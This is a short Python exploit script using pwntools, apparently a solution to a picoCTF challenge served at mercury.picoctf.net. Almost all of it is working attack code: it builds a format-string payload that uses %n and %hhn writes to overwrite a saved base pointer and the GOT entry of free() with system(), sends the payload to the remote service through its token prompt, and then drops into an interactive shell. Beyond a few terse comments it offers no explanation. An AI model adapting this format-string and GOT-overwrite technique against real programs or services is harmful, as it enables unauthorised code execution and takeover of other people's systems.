from pwn import *

def exploit(reornot):
    # context.log_level='debug'
    if(reornot == True):
        r = remote('mercury.picoctf.net', 25462)
    else:
        binary = context.binary = ELF('./vuln', checksec=False)
        r = process()
        
        # *p pointer in main() = $rbp - 0x10

        free_got = binary.got['free']
        system_got = binary.got['system']

        log.info(f"GOT address of free(): {hex(free_got)}")
        log.info(f"GOT address of system(): {hex(system_got)}")

    # system@plt = 0x4006f0
    # free@plt = 0x40
    payload = b'%c' * 10
    payload += b'%6299662x%n'             # Overwrite value of saved $rbp (main()'s $rbp) with free()
    payload += b'%216x%20$hhn'            # Overwrite the GOT of free() with system: 0xc6 + 0xd8(216) = 0xf0
    payload += b'%10504067x%18$n'

    log.info(f"Payload: {payload}")
    r.recvuntil('2) View my portfolio\n')
    r.sendline(b'1')

    r.recvuntil('token?\n')
    r.sendline(payload)

    # gdb.attach(r)
    r.interactive()

exploit(True)